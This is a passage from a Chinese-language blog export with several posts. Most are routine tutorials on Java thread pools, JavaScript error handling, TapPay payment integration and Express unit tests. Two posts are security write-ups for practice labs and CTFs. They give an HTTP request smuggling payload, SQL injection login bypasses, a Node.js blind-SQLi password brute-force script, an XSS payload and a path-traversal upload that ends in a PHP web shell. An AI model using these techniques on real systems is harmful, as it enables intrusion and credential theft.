不同的解析方式去攻擊透過帶入讓 server 混淆的 TE，可以藉此讓 server 不去解析 TE而改去解析 CL 舉例來說帶入 Transfer-Encoding: cowfront-end server 如果把它判別成錯誤的標題，此時會轉去判斷 CL這樣攻擊就是 CL.TE 攻擊了 反過來是 back-end server 解析錯誤，改轉去判斷 CL 的話那就是 TE.CL 攻擊了 根據網站去做攻擊實驗此實驗是 TE.CL 攻擊，代表 back-end server 針對 TE 解析有誤 123456789101112POST / HTTP/1.1Host: ac1b1fd31f891d6c80bb2c930035000c.web-security-academy.netContent-Length: 4Transfer-Encoding: chunkedTransfer-Encoding: cow16GPOST /test HTTP/1.10--- 不包含此行 byte 算法跟前面的 TE.CL 一樣 如果此漏洞是 front-end server 針對 TE 有解析問題的話Payload 和算法就要改成 CL.TE 的方式了 第一次送 request 會得到正常的請求 第二次送，因為前一次 request 走私了一個 request所以 response 會回應到此次 request 上就得到 Unreconize GPOST Method 了 後記上面簡單的根據自己理解的意思去說明了一下如何使用 HTTP Request Smuggling 攻擊其他更詳細的可以參考下面資料，都有提供 lab 去做攻擊而且官方寫的都非常詳細，非常建議去看看和玩玩看 lab 參考資料 What is HTTP request smuggling Finding HTTP Request Smuggling Exploiting HTTP Request Smuggling HTTP Desync Attacks: Request Smuggling Reborn 此文章是作者如何繞過 PayPal 登入機制所寫的","link":"/2019/09/30/http-smuggling/"},{"title":"Hacker 101 CTF Write Up Part 1 - Micro-CMS v2, TempImage","text":"近期想到 HackerOne 找找 Bug Bounty卻意外發現這邊有 CTF 可以玩玩，就順手玩了幾題然後做紀錄 Micro-CMS v2根據題目總共有 3 個 Flag 0x00一進來頁面長這樣 試著建立一個新的 Page, 發現要登入帳號密碼 看到帳號密碼就是要先下個單引號，結果就噴出 exception 了 根據 error 的 sqlcur.execute('SELECT password FROM admins WHERE username=\\'%s\\'' % request.form['username'].replace('%', '%%')可以推斷出他是透過 username select 出來後再用程式比對密碼有 SQL Injectiob 的話，就可以走 union all select 的套路username: 'union all select 1#password: 1 補充:union all select 可以組合前一個和後一個 SQL 結果假設 select username from admins where uername = 'admin' 會回傳 admin但如果是 select username from admins where uername = 'not_exists' 會回傳空的東西配合 union all select 的話select username from admins where uername = 'admin' union all select 1 會回傳 admin, 1 兩個值那如果是 select username from admins where uername = 'not_exists' union all select 1 只會回傳 1 登入成功後，可以看到有一個 Private Page 點進去後發現第一個 FLAG 0x01接下來嘗試新建立 Page 接下來就試著輸入 &lt;svg/onload=alert(document.cookie)，建立成功 發現好像也沒跳出什麼東西，嘗試去玩玩修改功能發現到第二次修改成功的時候會出現 Not Found URL，覺得有點疑惑 於是把 Payload 記下來拿到 Post Man 重新送送看，結果就拿到 FLAG 了 0x02這個漏洞找有點久，因為登入的時候，過幾秒會被導入到首頁，不會被停留在登入成功的頁面為了不讓 js 執行，所以改用 Post Man 去送，想看一下回來的 html 是什麼發現回來的 html 註解裡面有一個小提示 看起來是要往拿到真正的帳號密碼才會拿到 FLAG於是把資料丟到 sqlmap 就把資料 dump 出來的 登入成功後就拿到 FLAG 了 這邊用另一個不用 sqlmap 而是改用自己寫程式去做 (雖然 sqlmap 原理應該跟這個差不多)主要會用到 length(password) 和 length(username) 的方式先去判斷有幾個字元再透過 mysql _ 的匹配符號去做猜測，這個符號會去做一個比對假設字串是 username = abcde，username like ‘a____’ 就會比對成功，會回傳 true但如果是 username like ‘b____’ 就會比對失敗，會回傳 false接下來會利用這個特性去撰寫一個程式去找到完整的帳號密碼 假如說 length(password) = 5在 mysql 裡面可以這樣去寫 select username from admins where username = '' or password like '_____'然後在慢慢替換第一字 select username from admins where username = '' or password like 'a____' 去找到回傳 true 的狀況 先嘗試去找到密碼的長度，一般輸入結果如果為 false 會回傳 Uknown User 試著把 payload 改成 ' or 1=1# 發現回傳Invalid Password，代表說有找到使用者因為 false || true 的結果為 true，所以有成功從資料庫撈到資料 那是試著改成 ' or 1=221# 發現回傳 Uknown User 所以只要讓 username 那一段 sql 回傳 true，他就會把真正的密碼帶上來所以接下來可以試著用 ' or length(password)=1# 慢慢去比對看長度最後發現密碼長度為 8 接下來要構造出 like 的 payload 為 ' or password like binary '________'#如果上面成立的話，會回傳 Invalid Password 失敗的話則會回傳 Uknown User根據這兩個結果可以撰寫程式了，這邊會用 node.js 去做列舉這邊加上 binary 去強制去使用 CASE SENSITIVE 去做判別密碼為: marcelle 所以最後 username: ' or 1=1# password: marcelle登入後拿到 FLAG! 這邊附上程式123456789101112131415161718192021222324252627282930313233343536373839404142434445464748const axios = require('axios');const qs = require('querystring');(async () =&gt; { let passwordLength = 8; let password = (() =&gt; { let counter = 0; let temp = ''; while (counter &lt; passwordLength) { temp += '_'; counter++; } return temp })(); let found = false let answer = ''; let position = 0; let allPosibile = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\" while (!found) { let tempPassword = password for (const char of allPosibile) { tempPassword = tempPassword.split(\"\"); tempPassword[position] = char; tempPassword = tempPassword.join(\"\") let payload = `' or password like binary '${tempPassword}'#` let result = await axios({ url: 'http://34.74.105.127/58b04db906/login', method: 'post', headers: { 'content-type': 'application/x-www-form-urlencoded' }, data: qs.stringify({ username: payload, password: '' }) }).then(response =&gt; response.data) if (result.includes('Invalid password')) { console.log(`${position}: ${char}`); answer += char; break; } } position++; if (position &gt;= passwordLength) { break; } } console.log(answer);})() TempImage根據題目總共有 2 個 Flag 0x00剛進來頁面是這樣 點進去 upload.php 的頁面，發現可以上傳檔案 順便開原始碼有哪些 input 發現有 file 以及 filename 可以做更動，這邊先試著上傳一張正常的圖片URL: http://34.74.105.127/020fb13cda/files/eb705c0e32ff0f15c9801f5d40fe290f_test-3.png看起來是把我上傳的檔名變成檔案名稱了，這邊就試著改 filename (這邊使用 burp suit 去改，順便方便等等可以改內容)把 filename 改成 test-3.html 結尾 發現成功改成 .html 且成功是內容URL: http://34.74.105.127/020fb13cda/files/807fb7eecbe831518d078107d8f0fedf_test-3.html 這邊嘗試加上 ../ 在 filenmame 上面，發現爆出 FLAG 了 0x01從上一個 FLAG 發現有一個 move_upload_file 裡面會帶一個 path 這邊試著符合這個 path 帶入 /../test-3.html 試試看 發現 URL 變成 http://34.74.105.127/020fb13cda/files/test-3.html往上跳了一層 … !?因為此 server 可以執行 php，於是改成 php 試試看順便在檔案內容之中多加一個 &lt;?php phpinfo(); ?&gt; 發現內容還是顯示圖片格式? 這邊試著把檔案內容全砍掉只留下 &lt;?php phpinfo(); ?&gt; 結果被判定成不是 PNG 不能上傳了 如果不是改檔案副檔名和 Content-Type 會影響格式判斷的話有可能是根據 PNG 的前幾個 bytes 去判斷，所以這邊只留下前面的 bytes 發現無法顯示 QQ，這邊不確定原因，試了非常久 後來想到在上傳到上一層不知道會怎樣，於是試試看 發現成功執行 PHP 檔案！！所以代表可能是 files 那一層有鎖不能顯示 php 檔案URL: http://34.74.105.127/020fb13cda/test-3.php 接下來上傳 web shell 去看看有什麼檔案 逛了一下，發現 index.php 有 FLAG 存在","link":"/2019/09/04/hacker101-part1/"},{"title":"Java Executor、TheadPoolExecutor 設定參數基本介紹","text":"前言Thread Pool 的概念和使用 Database 的 Connection Pool 是很類似的概念就像 Connection Pool 的使用方法是去 Pool 裡面取得一個 Connection 使用使用完之後就關閉此 Connection，並把這個 Connection 丟回 Pool 之中讓其他程式使用 Thread Pool 也是這種概念，但在 JDK 1.5 之前的版本中是沒有一個管控的方式幾乎都是用 new Thread 的方式去創建使用在 JDK 1.5 之後的版本則是出了 Exectuor 去管控 Thread Pool ThreadPoolExecutor 介紹Java 提供了 ThreadPoolExecutor 能讓我們客製化定義不同的使用模式以下為 ThreadPoolExecutor 的設定即使用方法以及取用 Queue Size 以及 Thread Name 的方式 1234567891011121314151617ThreadPoolExecutor executor = new ThreadPoolExecutor( int corePoolSize, int maxPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, RejectedExecutionHandler handler);System.out.println(\"Queue size is: \" + executor.getQueue().size());executor.execute(new Runnable() { public void run() { System.out.println(\"running\"); System.out.println(\"Thread Name: \" + Thread.currentThread().getName()) }}) corePoolSize 核心 Thread 的數量，基本上 Thread 數量不會低於此數字 maxPoolSize Thread Pool 的最大數量，如果所有 Thread 都被執行的話 Task 會被塞到 Queue 之中等到有空閒的 Thread 為止 決定 maxPoolSize 的數量最好是根據系統資源去計算出來 Runtime.getRuntime().availableProcessors(); keeyAliveTime 當閒置時間超過此設定的時間的話，系統會開始回收 corePoolSize 以上多餘的 Thread unit keepAliveTime 的時間單位，可以使用 TimeUnit.SECONDS workQueue 決定當所有 Thread 都被執行時，Task 在 Queue 之中會以何種形式等待 handler Queue 已滿且 Thread 已達到 maxPoolSize 之後會以什麼樣的方式處理新的 Task BlockingQueue 詳細介紹基本規則為 如果當前的 Thread 小於 corePoolSize，則 Executor 首先會新增 Thread，而不會把 Task 丟到 Queue 之中 (基本上就是直接運行的意思) 如果當前的 Thread 大於等於 corePoolSize，則 Executor 首先會把 Task 加到 Queue 之中等待 當 Task 無法再被加入到 Queue 之中的話，則 Executor 首先會創建新的 Thread，直到超過 maxPoolSize 為止 超過 maxPoolSize 時，任務會被拒絕 BlockingQueue 有三種類型 直接提交代表類型: synchronousQueue基本上就 Queue Size 就是 0會直接把 Task 提交給 Thread，如果不存在可用 Thread，則新建一個如果此類型有設置 maxPoolSize 的話，是有可會拒絕新的 Task所以通常使這種類型，會建議 maxPoolSize 不要做上限設定 無界隊列 (Unbounded Queue)代表類型: LinkedBlockingQueueQueue 的大小是無限制的特別注意的是因為大小是無限制，所以萬一 Task 執行時間過長會導致有大量個 Task 卡在 Queue 之中動彈不得，進而導致 OOM 的發生Executors.newFixedThreadPool 採用的就是此種類型的 Queue 有界隊列 (Bounded Queue)代表類型: ArrayBlockingQueueQueue 的大小是有限制的但要注意的點是，這個 Queue 大小必須和 Thread Pool 相互搭配才可以發揮出比較好的效能使用大的 Queue Size 和小的 Thread Pool Size雖然可以有效降低 CPU 使用率，但會降低 QPS而使用小的 Queue Size 和大的 Thread Pool Size雖然可以提昇 QPS，但會降低 CPU Queue 飽和 RejectExecutionHandle 介紹再來要介紹當 Queue 飽和之後，可以根據不同 handle 做出不一樣的行為以下總計有四種使用方式 終止策略 (AbortPolicy)此為預設 Policy使用該 Policy，飽和時會拋出 RejectedExecutionException調用者可以用以下自行定義方式處理異常 12345678executor.setRejectedExecutionHandler(new RejectedExecutionHandler() { @Override public void rejectedExecution(Runnable r, ThreadPoolExecutor executor) { System.out.println(\"Get you!\"); r.run(); System.out.println(\"Done in handler\"); }}); 拋棄策略 (DiscardPolicy)不做任何處理直接拋棄 拋棄舊任務策略 (DiscardOldestPolicy)把 Queue 之中最頭的元素拋棄，並在嘗試重新提交 Task 調用者運行策略 (CallerRunsPolicy)\b\b簡單來說，飽和後會直接由調用 Thread Pool 的主 Thread 自己來執行這個 Task但在這個期間，主 Thread 就無法再度提交 Task從而讓 Thread Pool 有時間把正在處理的 Task 給完成 創建 Thread Pool 的四個常用方法這四個常用的方法都是透過 ThreadPoolExecutor 的不同參數所實作而成的 public static ExecutorService newFixedThreadPool(int nThreads) 創建固定數量的 Thead，提交 Task 的時候如果未達 nThreads 的數量的話，則會一直新建 Thread 達到 nThreads 時，之後的 Task 則會進入到佇列中 12345public static ExecutorService newFixedThreadPool(int nThreads) { return new ThreadPoolExecutor(nThreads, nThreads, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue&lt;Runnable&gt;());} public static ExecutorService newCachedThreadPool() Thread 的數量預設上限為 2^31 - 1，如果當 Thread 大於 Tasks 數量的時候 就會開始去回收那些等了超過 60 秒還沒有 Task 進來的 Thread 問題是，這個 newCachedThreadPool 是屬於動態新建所以萬一 Task 一直大於 Thread 數量的話則會一直新建 這樣很容易耗光機器資源，使用這個最好的狀況是 Task 的執行時間是短的才比較適合 12345public static ExecutorService newCachedThreadPool() { return new ThreadPoolExecutor(0, Integer.MAX_VALUE, 60L, TimeUnit.SECONDS, new SynchronousQueue&lt;Runnable&gt;());} public static ExecutorService newSingleThreadExecutor() 創建一個 Single Thread，因為此 Thread 被使用的話其他都會是在佇列中等待，所以效能會下降 1234public static ScheduledExecutorService newSingleThreadScheduledExecutor() { return new DelegatedScheduledExecutorService (new ScheduledThreadPoolExecutor(1));} public static ScheduledExecutorService newScheduledThreadPool(int corePoolSize) 支持定時以及週期性執行 Task 的需求 123public static ScheduledExecutorService newScheduledThreadPool(int corePoolSize) { return new ScheduledThreadPoolExecutor(corePoolSize);} 看看 Parent Class 1234public ScheduledThreadPoolExecutor(int corePoolSize) { super(corePoolSize, Integer.MAX_VALUE, 0, NANOSECONDS, new DelayedWorkQueue());} 但是基本上不是很推薦使用以上這四種方法去定義 Thread Pool在阿里巴巴的 Java 開發手冊中也有提到，如果要新建 Thread請透過 ThreadPoolExecutor 的方式去自定義 Thread Pool 的使用模式在這篇文章的樓主也是因為用了以上其中一個方法採到 OOM 的雷所以在設定 Thread Pool 的時候要特別注意使用的情況適不適合！ References Java Executor并发框架 一次Java线程池误用引发的血案和总结 如何使用ThreadPool 并发新特性—Executor 框架与线程池 Java ThreadPoolExecutor and BlockingQueue Example","link":"/2019/02/19/java-executor/"},{"title":"callback, promise, async/await 使用方式教學以及介紹 Part II (Error Handling 介紹)","text":"上一篇主要是介紹如何使用這篇會介紹該如何去在每一種使用方式之中去做 Error Handling callback相信各位有在使用別人第三方套件或是 Node.js 原生的 Library 都會發現一件事情那就是 callback 第一個參數都會是 error雖然這看似是一個不成文的規定，但仔細想想把 error 放在第一個是非常合理的假設當 callback 參數回傳越來越多的時候，總不可能把 error 放在最後一個去處理因為你會始終不知道哪一個會是 error \b\b\b\b\b(就算寫註解也會讀到瘋掉)試想一下這幾段 code 就可以理解了 123456789101112131415function test(cb) { // 當 function 成功後 cb(successful_data_1, successful_data_2)}test((successful_data_1, successful_data_2) =&gt; { // \b開心地處理兩個回傳的資料})// --- 分隔線 function test(cb) { // 當 function 失敗後 cb(error)}test((error) =&gt; { // \b咦? 第一個到底是 error 還是我原本的 successful_data_1}) 當遇到上面的狀況就會變得非常難判斷，但如果我整體改寫成這樣就會變得輕而易舉 12345678910111213141516171819function test(cb) { // 當 function 成功後 cb(null, successful_data_1, successful_data_2)}test((error, successful_data_1, successful_data_2) =&gt; { if (error != null) { } // \b開心地處理兩個回傳的資料})// --- 分隔線 function test(cb) { // 當 function 失敗後 cb(error)}test((error, successful_data_1, successful_data_2) =&gt; { if (error != null) { // 開心地處理 error, 於是 data_1 以及 data_2 就完全不用管他們了 }}) 當然有人會說『啊我就把所有參數丟到第一個當 Object 全部存起來，第二個就放 Error 也是一種方式啊』這樣講的話當然沒錯，但如果把所有東西都放在第一個 Object 裡面這樣參數就會有分類，使用問題也只是會徒增而已再加上這算是一種共識了，所以跟潛規則走會比較方便一點 promisePromise 處理 error 的方式就比較特別了，我們先來看看一般 promise 出錯的時候是怎麼抓取的 123456function test() { return new Promise((res, rej) =&gt; { rej(\"this is error\"); })}test().then((data) =&gt; {console.log(\"Get \" + data)}).catch((error) =&gt; {console.log(\"handle! \" + error)}); // this is error 上面為一般 promise 用 rej 的方式，外面用 catch 去抓住這個錯誤但凡事要考慮例外，萬一有一個 error 是你沒辦法 rej 到的話，那該要怎麼抓取? 123456function test() { return new Promise((res, rej) =&gt; { oqiwje() // non-exist function })}test().then((data) =&gt; {console.log(\"Get \" + data)}).catch((error) =&gt; {console.log(\"handle! \" + error)}); // this is error 會發現當在 Promise 裡面出錯的話，外面的 catch 也是能抓到的其原因是因為 Promise 是有被一層內部的 try-catch 給包住且在內部的 catch 那一邊套用了預設地 rej function所以外面才抓得到 那如果放在 Promise 外面的話呢?? 123456function test() { oqiwje() // non-exist function return new Promise((res, rej) =&gt; { })}test().then((data) =&gt; {console.log(\"Get \" + data)}).catch((error) =&gt; {console.log(\"handle! \" + error)}); 咦!? 竟然抓不到，error 直接噴出來!但這也不意外，因為出了 Promise 到了外面那就是要透過自己去寫 try-catch 才能抓取到這個錯誤 12345678910function test() { oqiwje() // non-exist function return new Promise((res, rej) =&gt; { })}try { test().then((data) =&gt; {console.log(\"Get \" + data)}).catch((error) =&gt; {console.log(\"handle! \" + error)});} catch (error) { console.log(\"handled by outer try-catch\");} 還有一種 Handle 方式是寫在內層 function 裡面 123456function test() { return new Promise((res, rej) =&gt; { oqiwje() // non-exist function }).catch(error =&gt; \"handle by inner function\")}test().then((data) =&gt; {console.log(\"Get \" + data)}).catch((error) =&gt; {console.log(\"handle! \" + error)}); // Get handle by inner function 那因為在 inner function 裡面被抓取到，並且回傳還記得 promise chain 中，如果 return 的話是會到下一個 then 去的所以這邊會被外面的 then 給抓到，而不是 catch，這邊要注意 Promise 的 Error Handling 只要能確保能執行到 rej 就沒什麼問題了然而在 Promise 之前用 try-catch 包起來或程式都丟到 Promise 裡面等他報錯丟出來也可以處理到 async/awaitawait catch error 的方式可以想成一般 try-catch 的方式 12345678910111213function test() { return new Promise((res, rej) =&gt; { rej(\"QQQ\"); });}async function main() { try { let result = await test() } catch (error) { console.log(\"Handled by main\") }}main() 而要特別注意的是，如果把 catch 寫在外面的 await 那裡的話會造成程式不會往最外層的 catch 前進 123456789101112131415function test() { return new Promise((res, rej) =&gt; { rej(\"QQQ\"); });}async function main() { try { let result = await test().catch(() =&gt; {console.log(\"Handled by await\")}) // 因為有正確被 handle 到，所以程式是會繼續下去執行的 console.log(\"Still going\") } catch (error) { console.log(\"Handled by main\") }}main() 但如果透過在 catch function 裡面把 error 再次 throw 出來的話，是可以成功 throw 出來 123456789101112131415161718function test() { return new Promise((res, rej) =&gt; { rej(\"QQQ\"); });}async function main() { try { let result = await test().catch(() =&gt; { console.log(\"Handled by await\") throw new Error(\"QQQQ\") }) // 因為在上面做 throw error，所以程式不會繼續走下去 console.log(\"Still going\") } catch (error) { console.log(\"Handled by main\") }}main() 千萬要注意 return 和 throw 的方式會帶來不一樣的結果使用 return 就跟 Promise 的 reject 的狀態下 return 是一樣的他會回傳到下一個 then 裡面 (也就是 resolved 的狀態) 12345678910111213141516171819function test() { return new Promise((res, rej) =&gt; { rej(\"QQQ\"); });}async function main() { try { let result = await test().catch(() =&gt; { console.log(\"Handled by await\") return new Error(\"QQQQ\") }) // 因為在上面做 return, 相當於是把結果回傳到 result 裡面了 console.log(result); // Error: QQQQ console.log(\"Still going\") } catch (error) { console.log(\"Handled by main\") }}main() 而個人比較不建議的寫法是在 await 那一層做 Error Handling而是盡量再底層那裡做 throw error 到最外面的 try-catch 去接原因是這跟 Design Pattern 有關係最外層的 main 可以想像是 Controller，而 test 可以想像成 Facade在裡面得程式才是真正的商業邏輯從下面程式來解讀的話，回家主要目的是要做功課那做功課一定會有流程，像是先吃飯，洗澡，最後在讀書這樣的順序但要怎麼吃飯洗澡讀書是要寫在每一個該做的項目的最裡面，而不會寫在順序那一層這樣程式撰寫上會比較乾淨一點 12345678910111213141516171819202122232425262728293031323334function eatFirst() { return new Promise((res, rej) =&gt; { setTimeout(() =&gt; { res(\"Error\"); }, 1000); });}function getBook() { return new Promise((res, rej) =&gt; { setTimeout(() =&gt; { res(\"Error\"); }, 1000); });}function writeIt() { return new Promise((res, rej) =&gt; { setTimeout(() =&gt; { rej(\"Books are ate by dogs!!!\"); }, 1000); });}async function doHomeWork() { await eatFirst() await getBook() await writeIt()}async function main() { try { let result = await doHomeWork(); } catch (error) { console.log(\"Handled by main\") }}main(); 後記這次主要介紹 Error Handling 的方式也加了一些個人建議撰寫的方法，如果有其他想法歡迎大家來討論！","link":"/2019/05/02/promise-2/"},{"title":"如何串接上 TapPay 並完成第一筆交易!","text":"這篇文章主要是說明如何使用 TapPay 這個服務TapPay 是一家金流廠商，主要都是做線上金流，詳細就不多說有興趣想要詳細了解可以去參考官網 https://www.tappaysdk.com 最近剛好被派去串接 TapPay 的服務，就順便把整個流程給記錄下來了這邊會以 Web 服務為主去做範例，完整程式碼，請參考最下面 環境設置 TapPay Portal 申請 要拿到以下的值才有辦法作後續的付款 App Key (應用程式頁面) App ID (應用程式頁面) Partner Key (帳號資訊頁面) Merchant ID (商家管理頁面) 程式部分 前端: HTML + Javascript + CSS 後端: nodejs (v6) 網域部分 設置 /etc/hosts這邊要特別注意，要去 /etc/hots 底下設置跟在 TapPay Portal 所建立的 domain 一樣才有辦法 Get Prim，否則會一直出現 CORS 的問題待會在細部流程的時候會做介紹 測試卡號 測試卡號可以參考這裡 https://docs.tappaysdk.com/tutorial/zh/reference.html#test-card card number 4242424242424242 month 01 year 23 ccv 123 流程介紹主要分成以下幾個步驟 前端 使用 TapPay SDK 設置好輸入卡號的表單 按下按鈕觸發 TapPay 的 GetPrime 方法 拿到 Prime 把 Prime 送到後端 後端 拿到前端送來的 Prime 把 Prime 加上其他所需參數送往 TapPay Server 完成付款! 程式撰寫 - 前端根據最新的 SDK 發佈的方法, 可以直接在一個 element 底下把卡號輸入表單塞進去 HTMLHTML 分成兩個部分 建立好一個 div 準備等等被塞入輸入卡號表單 建立好 trigger button 來觸發 Get Prime 方法 123456789&lt;div style=\"width: 480px; margin: 50px auto;\"&gt; &lt;label&gt;CardView&lt;/label&gt; &lt;!-- 這是我們要塞表單的地方 --&gt; &lt;div id=\"cardview-container\"&gt;&lt;/div&gt; &lt;!-- 這是我們要觸發 GetPrime 方法的地方 --&gt; &lt;button id=\"submit-button\" onclick=\"onClick()\"&gt;Get Prime&lt;/button&gt;&lt;/div&gt; JavascriptJavascript 分成三個部分 初始化金鑰 植入輸入卡號表單 觸發 getPrime 方法 12345678910111213141516171819// 設置好等等 GetPrime 所需要的金鑰TPDirect.setupSDK(APP_ID, \"APP_KEY\", \"sandbox\") // 把 TapPay 內建輸入卡號的表單給植入到 div 中TPDirect.card.setup('#cardview-container')var submitButton = document.querySelector('#submit-button')function onClick() { // 讓 button click 之後觸發 getPrime 方法 TPDirect.card.getPrime(function (result) { if (result.status !== 0) { console.err('getPrime 錯誤') return } var prime = result.card.prime alert('getPrime 成功: ' + prime) })} 沒錯！你沒看錯，不到 30 行但是，這邊要注意到一個地方，如果你 Get Prime 之後沒有任何反應打開開發者模式後卻看到了這個getPrime 錯誤題外話，如果並不使用 TPDirect.card.setup 版本的話而是自己實作整個流程，則會看到 CORS 的紅字 這個代表你開發的網域和你在 TapPay Portal 上面所填寫的網域是不一樣的這就是一開始在環境設置提到的 /etc/hosts 有關係 假設你未來可能要使用的網域是 example-tappay.yujack.com 的話請到 /etc/hosts localhost 下面加上一段 12127.0.0.1 localhost127.0.0.1 example-tappay.yujack.com 然後回到網頁上把 URL 從http://localhost:8080/ 改成 http://example-tappay.yujack.com:8080/這樣 Get Prime 就會成功了！ 不過要注意，如果你未來要用的網域是已經在用的話在 /etc/hosts 底下是上去是沒有用的所以切記用一個沒在用的網域做測試否則 .. 你只好直接部署上去測試了 程式撰寫 - 後端小弟我是習慣用 nodejs 撰寫後端伺服器所以這邊會以 nodejs 去做付款的動作前端 Get Prime 成功之後, 就要把這組 prime 送到後端了 建立 NodeJs server12345678910111213141516171819const express = require('express')const app = express()const bodyParser = require('body-parser')const https = require('https');const PORT = 8080app.use(bodyParser.json())app.use(bodyParser.urlencoded({ extended: false}))app.use('/', express.static(__dirname + \"/html\")) //serve static contentapp.post('/pay-by-prime', (req, res, next) =&gt; { // 必須要把程式實作在這邊})app.listen(PORT, () =&gt; { console.log('Connet your webiste in the http://localhost:8080/');}) 實作 Pay by Prime接下來要實作 pay-by-prime 的程式要加到 app.post(‘/pay-by-prime’) 裡面這裡有兩個參數要注意兩個都是在 TapPay Portal 上面申請帳號時會獲得的，程式如下 Partner Key (帳號資訊頁面) Merchant ID (商家管理頁面) 另外就是 headers 裡面要特別帶 x-api-key 進去否則會收到 access deny 的 response 可以參考 https://docs.tappaysdk.com/tutorial/zh/back.html#pay-by-prime-api所需要帶的參數和 headers 12345678910111213141516171819202122232425262728293031323334353637383940const post_data = { // prime from front-end \"prime\": req.body.prime, \"partner_key\": \"PARTNER_KEY\", \"merchant_id\": \"MERCHANT_ID\", \"amount\": 1, \"currency\": \"TWD\", \"details\": \"An apple and a pen.\", \"cardholder\": { \"phone_number\": \"+886923456789\", \"name\": \"yujack\", \"email\": \"example@gmail.com\" }, \"instalment\": 0, \"remember\": false}const post_options = { host: 'sandbox.tappaysdk.com', port: 443, path: '/tpc/payment/pay-by-prime', method: 'POST', headers: { 'Content-Type': 'application/json', // 這個參數必須要帶上去，否則不會過 'x-api-key': 'PARTNER_KEY' }}const post_req = https.request(post_options, function(response) { response.setEncoding('utf8'); response.on('data', function (body) { return res.json({ result: JSON.parse(body) }) });});post_req.write(JSON.stringify(post_data));post_req.end(); 實作完成後，開啟 nodejs server然後打上測試卡後就可以完成付款了！打完收工！下班去！ 前端補正記得前端要補上把 prime 帶上來的程式123$.post('/pay-by-prime', {prime: prime}, function(data) { alert('付款成功' + JSON.stringify(data))}) 完整程式碼資料夾結構12345||--- app.js||----html| |---index.html 前端1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;script text=\"text/javascript\" src=\"https://js.tappaysdk.com/tpdirect/v2_2_1\"&gt;&lt;/script&gt; &lt;script src=\"https://code.jquery.com/jquery-2.2.4.min.js\"&gt;&lt;/script&gt; &lt;title&gt;Connect payment with TapPay&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div style=\"width: 480px; margin: 50px auto;\"&gt; &lt;label&gt;CardView&lt;/label&gt; &lt;div id=\"cardview-container\"&gt;&lt;/div&gt; &lt;button id=\"submit-button\" onclick=\"onClick()\"&gt;Get Prime&lt;/button&gt; &lt;pre id=\"result1\"&gt;&lt;/pre&gt; &lt;pre id=\"result2\"&gt;&lt;/pre&gt; &lt;/div&gt; &lt;script&gt; TPDirect.setupSDK(APP_ID, 'APP_KEY', 'sandbox') TPDirect.card.setup('#cardview-container') var submitButton = document.querySelector('#submit-button') var cardViewContainer = document.querySelector('#cardview-container') function onClick() { TPDirect.card.getPrime(function (result) { if (result.status !== 0) { console.log('getPrime 錯誤') return } alert('getPrime 成功') var prime = result.card.prime document.querySelector('#result1').innerHTML = JSON.stringify(result, null, 4) $.post('/pay-by-prime', {prime: prime}, function(data) { alert('付款成功') document.querySelector('#result2').innerHTML = JSON.stringify(data, null, 4) }) }) } &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 後端記得先執行以下 command1npm install body-parser express 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556const express = require('express')const app = express()const bodyParser = require('body-parser')const https = require('https');const PORT = 8080app.use(bodyParser.json())app.use(bodyParser.urlencoded({ extended: false}))app.use('/', express.static(__dirname + \"/html\")) //serve static contentapp.post('/pay-by-prime', (req, res, next) =&gt; { const post_data = { \"prime\": req.body.prime, \"partner_key\": \"PARTNER_KEY\", \"merchant_id\": \"MERCHANT_ID\", \"amount\": 1, \"currency\": \"TWD\", \"details\": \"An apple and a pen.\", \"cardholder\": { \"phone_number\": \"+886923456789\", \"name\": \"jack\", \"email\": \"example@gmail.com\" }, \"remember\": false } const post_options = { host: 'sandbox.tappaysdk.com', port: 443, path: '/tpc/payment/pay-by-prime', method: 'POST', headers: { 'Content-Type': 'application/json', 'x-api-key': 'PARTNER_KEY' } } const post_req = https.request(post_options, function(response) { response.setEncoding('utf8'); response.on('data', function (body) { return res.json({ result: JSON.parse(body) }) }); }); post_req.write(JSON.stringify(post_data)); post_req.end();})app.listen(PORT, () =&gt; { console.log('Connet your webiste in the http://localhost:8080/');})","link":"/2017/09/23/tappay-payment/"},{"title":"express unit test 一些技巧教學以及困難點","text":"前言上一篇我們講到使用 sinon 搭配 express 的使用基礎今天會介紹的是關於在 express 上實作 unit test 的幾個技巧以及可能會遇到的問題該如何解決問題，並依靠 sinon 去達到希望的功效 stub 同一個 object在開始寫 unit test 之後會開始發現一件事情，就是需要對同一個物件重複做 stub在 a.test.js 需要 stub 一次在 b.test.js 又需要 stub 一次 直覺上測試程式可能會變成以下的樣子12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364// login.test.jsconst apiServiceStub = sinon.stub(apiService);describe(\"[登入功能]\", () =&gt; { it(\"登入成功\", async () =&gt; { const req = mockRequest({ username: \"123\" }) const res = mockResponse(); apiServiceStub.login.withArgs(\"123\").resolves({ status: 0 }); await loginController.run(req, res) sinon.assert.calledWith(res.json, { message: \"登入成功\", }); sinon.assert.calledOnce(res.json); }) it(\"登入錯誤\", async () =&gt; { const req = mockRequest({ username: \"123\" }) const res = mockResponse(); apiServiceStub.login.withArgs(\"123\").resolves({ status: -1 }); await loginController.run(req, res) sinon.assert.calledWith(res.json, { message: \"登入失敗\", }); sinon.assert.calledOnce(res.json); })})// register.test.jsconst apiServiceStub = sinon.stub(apiService);describe(\"[註冊功能]\", () =&gt; { it(\"註冊成功\", async () =&gt; { const req = mockRequest({ username: \"123\" }) const res = mockResponse(); apiServiceStub.register.withArgs(\"123\").resolves({ status: 0 }); await registerController.run(req, res) sinon.assert.calledWith(res.json, { message: \"註冊成功\", }); sinon.assert.calledOnce(res.json); }) it(\"註冊錯誤\", async () =&gt; { const req = mockRequest({ username: \"123\" }) const res = mockResponse(); apiServiceStub.register.withArgs(\"123\").resolves({ status: -1 }); await registerController.run(req, res) sinon.assert.calledWith(res.json, { message: \"註冊失敗\", }); sinon.assert.calledOnce(res.json); })}) 我們在 login.test.js 以及 register.test.js都對 apiServer 進行 